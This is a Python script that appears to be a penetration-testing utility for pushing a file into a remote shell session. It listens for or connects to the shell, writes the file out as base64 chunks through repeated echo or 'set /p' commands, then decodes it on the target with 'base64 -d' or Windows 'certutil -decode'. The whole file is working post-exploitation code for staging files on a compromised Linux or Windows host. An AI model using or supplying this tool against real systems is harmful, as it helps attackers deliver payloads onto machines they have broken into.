#!/usr/bin/env python3
# coding=utf-8
# Time    : 2021/2/8 4:02 PM
# Author  : Ar3h
import time
from socket import *
import base64
import logging
import argparse
import sys
from string import Template
import hashlib

'''
shell 最大输入长度
linux: 4096
win: 8191
'''


class ShellHandler:

    def __init__(self, filename, addr, type, os, delay, size):
        self.filename = filename
        self.addr = addr
        self.type = type
        self.os = os
        self.delay = delay
        self.size = size
        self.run()

    def run(self):
        if os == "linux":
            self.current_create_template = Template("echo -n '' > $tmp_filename")
            self.current_cmd_template = Template("echo -n '$text' >> $tmp_filename")
            self.current_b642bin_template = Template("cat $tmp_filename | base64 -d > $filename")
            self.current_md5_template = Template("md5sum $filename")

        elif os == "win":
            self.current_create_template = Template(">$tmp_filename set /p=\"\"")
            self.current_cmd_template = Template(">>$tmp_filename set /p=\"$text\"")
            self.current_b642bin_template = Template("certutil -f -decode $tmp_filename $filename")
            self.current_md5_template = Template("CertUtil -hashfile $filename md5")

        else:
            exit()

        try:
            if type == "listen":
                self.listen()
            elif type == "connect":
                self.connect()
        except ConnectionRefusedError:
            logging.info("连接被拒绝，无法连接目标主机")
        except Exception as e:
            print(e)

    def readfile(self, file) -> str:
        with open(file, "rb") as f:
            file = f.read()
            self.md5_str = hashlib.md5(file).hexdigest()
            return base64.b64encode(file).decode()

    def listen(self):
        s = socket(AF_INET, SOCK_STREAM)
        logging.info(f"Listen to {addr[0]}:{addr[1]} ...")
        s.bind(self.addr)
        s.listen(2)
        fd, addr2 = s.accept()
        logging.info(f"Connect from {addr2[0]}:{addr2[1]} ...")
        self.sendFile(fd)

    def connect(self):
        s = socket(AF_INET, SOCK_STREAM)
        logging.info(f"Connect to {addr[0]}:{addr[1]} ...")
        s.connect(self.addr)
        logging.info(f"Connect to {addr[0]}:{addr[1]} success")
        self.sendFile(s)

    def sendFile(self, socket):
        # if self.os == "win":
        #     socket.recv(1024)
        tmp_filename = filename + ".tmp"
        file = self.readfile(f"{filename}")
        file_size = len(file)

        # 创建空临时文件
        logging.info(f"{filename} size is {str(file_size / 1024)} Kb")
        logging.info(f"Create temp file '{tmp_filename}' ")
        cmd_create = self.current_create_template.substitute(tmp_filename=tmp_filename)
        logging.debug(cmd_create)
        self.send_cmd(socket, cmd_create)

        logging.info(f"start to send '{filename}'")
        # 发送文件
        str_len = size  # 每次发送的字节数
        for i in range(0, file_size, str_len):
            step = int((i / file_size) * 100)
            print('\r[%3d%%] ' % step, end='', flush=True)

            file_seg = str(file[i:i + str_len])
            cmd = self.current_cmd_template.substitute(tmp_filename=tmp_filename, text=file_seg)
            logging.debug(cmd)
            self.send_cmd(socket, cmd)
        else:
            print('\r[100%] ', end='', flush=True)
            logging.info(f"end send '{filename}'")

            # base64转二进制文件
            cmd_b642bin = self.current_b642bin_template.substitute(tmp_filename=tmp_filename, filename=filename)
            logging.info("base64 convert to bin")
            logging.debug(cmd_b642bin)
            self.send_cmd(socket, cmd_b642bin)

            # 删除临时文件xxx.tmp
            # cmd_del = f"rm -f {tmp_filename}"
            # logging.info(f"delete temp file {tmp_filename}")
            # logging.debug(cmd_del)
            # self.send_cmd(socket, cmd_del)

            # logging.warning(f"You need to Delete '{tmp_filename}' file by yourself")
            logging.info(f"Send '{filename}' success !")
            md5_cmd = self.current_md5_template.substitute(filename=filename)
            logging.info(f"Orign file '{filename}' md5: {self.md5_str}")
            logging.info(f"You can check md5sum use cmd: \033[32m{md5_cmd}\033[0m")

    def send_cmd(self, socket, cmd):
        time.sleep(self.delay)  # 延迟
        if self.os == "linux":
            socket.send((cmd + "\n").encode())
        elif self.os == "win":
            socket.send((cmd + "\n\n").encode())  # 命令需要两个回车确定


def parse_args():
    parser = argparse.ArgumentParser(
        epilog=f"example: "
               f"linux -  python3 {sys.argv[0]} -f filename -l 0.0.0.0:8080")
    parser.add_argument("-f ", "--file", help="need to read file", type=str, required=True)
    parser.add_argument("-l", "--listen", help="listen to address. Default :0.0.0.0:55555", type=str,
                        default="0.0.0.0:55555")
    parser.add_argument("-c", "--connect", help="connect to listening shell")
    parser.add_argument("-o", "--os", choices=["win", "linux"], help="target shell operate system. Default: linux",
                        default="linux")
    parser.add_argument("-d", "--delay", type=float, help="Delay between every two commands. Default: 0.05 s",
                        default=0.05)
    parser.add_argument("-s", "--size", type=int,
                        help="Every size of command. Default: 1000 Byte. Suggest between 100 and 4000", default=1000)
    parser.add_argument("-v", "--verbose", help="Increase output verbosity.", default=False, action='store_true')

    return parser.parse_args()


if __name__ == '__main__':
    args = parse_args()

    # logging.basicConfig()
    if args.verbose:
        logging.basicConfig(level=logging.DEBUG, format='[%(asctime)s] [%(levelname)s] %(message)s', datefmt="%H:%M:%S")
    else:
        logging.basicConfig(level=logging.INFO, format='[%(asctime)s] [%(levelname)s] %(message)s', datefmt="%H:%M:%S")

    if args.connect:
        ip, port = args.connect.split(":")
        type = "connect"
    elif args.listen:
        ip, port = args.listen.split(":")
        type = "listen"

    addr = (ip, int(port))
    filename = args.file
    os = args.os
    delay = args.delay
    size = args.size
    ShellHandler(filename, addr, type, os, delay, size)
